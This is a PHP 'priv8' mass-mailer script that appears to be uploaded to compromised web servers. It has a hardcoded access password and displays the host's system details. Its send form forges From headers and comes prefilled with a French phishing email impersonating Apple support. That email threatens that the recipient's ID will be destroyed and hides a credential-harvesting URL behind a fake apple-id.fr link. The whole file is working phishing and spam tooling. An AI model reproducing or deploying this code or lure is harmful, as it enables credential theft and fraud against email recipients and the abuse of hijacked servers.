<?php
@session_start();
@set_time_limit(0);
if((isset($v) AND $v==0) OR (isset($t) AND $t==false)){
die('');
}
$create_password = true;
$password = "Abdou";
$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}
if($create_password==true){
if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die("
<noembed><xmp><body></xmp></noembed><noembed><xmp></body></html></xmp></noembed><title>LockeD By Joky</title><center><body background=white<table width=1 bgcolor=white><tr><td><font size=1 face=verdana><center><b></font></a><br></b></center><form method=post><font size=1 face=verdana color=808080><strong><center>LockeD By Joky<br>pass plz:</center></strong><br><input type=password name=pass size=10></form>
</td></tr></table>
");}
}
$testa = $_POST['veio'];
if($testa != "") {
$message = $_POST['html'];
$subject = $_POST['assunto'];
$nome = $_POST['nome'];
$de = $_POST['de'];
$to = $_POST['emails'];
$email = explode("\n", $to);
$message = stripslashes($message);
$i = 0;
$count = 1;
while($email[$i]) {
$ok = "ok";
$headers  = "MIME-Version: 1.0\n";
$headers .= "Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 7bit
X-Mailer: EDMAIL R6.00.02
Content-Length: 41061\n";
$headers .= "From: ".$email[$i]."\r\n";
if(mail($email[$i], $subject, $message, $headers))
echo "<font color=gren>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=gren>Sent....!</font><br><hr>";
else
echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>Error in Sending ??</font><br><hr>";
$i++;
$count++;
}
$count--;
if($ok == "ok")
echo ""; 

}

?>
<html>
<head>
<title>Joky Priv8 Mailer</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
    margin-left: 0;
    margin-right: 0;
    margin-top: 0;
        background-color: #000000;
    margin-bottom: 0;
}
.titulo {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 70px;
    color: #1BF51F;
    font-weight: bold;
}

.normal {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 12px;
    color: #1BF51F;
}

.form {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 10px;
    color: #FFFFFF;
    background-color: #000000;
    border: 1px dashed #666666;
}

.texto {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
}

.alerta {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-weight: bold;
    color: #990000;
    font-size: 10px;
}
</style>
</head>
<body>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">

    <tr>

 
<table border="0" width="53%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 1px ridge #1BF51F" bgcolor="black" > 
     <td width="462" height="25" align="center" bgcolor="#000000"><span class="titulo">Mortolino</span></td>
<tr align="left"> 
<td colspan="2" ><font color="#1BF51F">
Server Name: <?php echo $UNAME = @php_uname(); ?><br>
System: <?php echo $OS = @PHP_OS; ?><br>
Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Software : <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
Admin Mail: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>
</td>

</center>


    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#000000">
          <table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="444">
          <tr>
            <td align="right" height="17"><span class="texto">Subject:</span></td>
            <td height="17"><input name="assunto" type="text" value="[CAF.FR] :Au sujet de votre Remboursements"class="form" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#000000"><span class="texto">Joky Mailer</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="html">
<p><br />
<style type="text/css"><!--
.ExternalClass .ecxhmmessage P {
padding:0px;
}

.ExternalClass body.ecxhmmessage {
font-size:12pt;
font-family:Calibri;
}

--></style></p>
<div dir="ltr">
<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center" style="line-height:21.299999237060547px;color:rgb(68, 68, 68);font-size:15px;">
    <tbody>
        <tr>
            <td style="padding:20px 11px 40px;"><br />
            <table width="630" border="0" cellspacing="0" cellpadding="0" align="center" style="line-height:21.299999237060547px;background-color:rgb(241, 241, 241);">
                <tbody>
                    <tr>
                        <td>
                        <table width="490" border="0" cellspacing="0" cellpadding="0" align="center" style="line-height:21.299999237060547px;border-top-width:1px;border-top-style:solid;border-top-color:rgb(204, 204, 204);">
                            <tbody>
                                <tr>
                                    <td width="490" align="left" style="padding:0px 0px 22px;">
                                    <div style="line-height:1.25em;font-family:'Lucida Grande', 'Lucida Sans', 'Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif;color:rgb(51, 51, 51);font-size:12px;">
                                    <p><span style="background-color: rgb(255, 255, 255);"><br style="line-height:17.040000915527344px;" />
                                    <br style="line-height:17.040000915527344px;" />
                                    Bonjour,<br style="line-height:17.040000915527344px;" />
                                    </span></p>
                                    <p><span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255);">Nous vous informons que votre ID arrive d'expiration dans moins de 48 heures,</span><span style="background-color: rgb(255, 255, 255);">il est imp&eacute;ratif d'effectuer une v&eacute;rification de vos informations a pr&eacute;sent ,sans quoi votre ID sera d&eacute;truit .</span></span><span style="background-color: rgb(255, 255, 255);">Cliquez simplement sur le lien ci-dessous et ouvrez</span><span style="background-color: rgb(255, 255, 255);">une session a l'aide de votre Apple ID et de votre mot de passe .</span></p>
                                    <div style="line-height:1.25em;font-family:'Lucida Grande', 'Lucida Sans', 'Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif;color:rgb(51, 51, 51);font-size:12px;"><span style="background-color: rgb(255, 255, 255); line-height: 1.25em;">Pour v&eacute;rifier vos param&egrave;tres de s&eacute;curit&eacute;, connectez-vous &agrave;</span></div>
                                    </div>
                                    <div style="line-height:1.25em;font-family:'Lucida Grande', 'Lucida Sans', 'Lucida Sans Unicode', Arial, Helvetica, Verdana, sans-serif;color:rgb(51, 51, 51);font-size:12px;"><span style="background-color: rgb(255, 255, 255);"><a href="https://professional-nursing.com/cfide/aps2014.html" target="_blank">https://apple-id.fr/login/</a>&nbsp;.<br style="line-height:17.040000915527344px;" />
                                    <br style="line-height:17.040000915527344px;" />
                                    Ceci est un message g&eacute;n&eacute;r&eacute; automatiquement. Merci de ne pas y r&eacute;pondre. Si vous avez besoin d'aide, veuillez vous rendre sur le site&nbsp;<a href="http://www.apple.com/fr/support/appleid" class="ecxaapl-link" target="_blank" style="line-height:17.040000915527344px;font-weight:inherit;text-decoration:none;color:rgb(0, 136, 204);cursor:pointer;">Apple Support</a>.<br style="line-height:17.040000915527344px;" />
                                    <br style="line-height:17.040000915527344px;" />
                                    Cordialement,<br style="line-height:17.040000915527344px;" />
                                    L'Assistance client Apple 2014</span></div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                        </td>
                    </tr>
                    <tr>
                        <td style="padding-top:40px;">&nbsp;</td>
                    </tr>
                </tbody>
            </table>
            </td>
        </tr>
    </tbody>
</table>
</div>
</textarea>
              <span class="alerta">*Reminder: Text HTML</span></td>



          </tr>
          <tr align="center" bgcolor="#000000">
            <td height="10" colspan="2"><span class="texto">Mailing List</span>
             
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">
nowhere29@live.com
nowhow29@yahoo.com
</textarea>
              <span class="alerta">* Mail List</span> </td>
          </tr>
          <tr>
            <td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" value="Enviar"></td>
          </tr>
        </table>
      </td>
    </tr>
    <tr>
      <td height="15" align="center" bgcolor="#000000">&nbsp;</td>
    </tr>
  </table>
</form>
</body>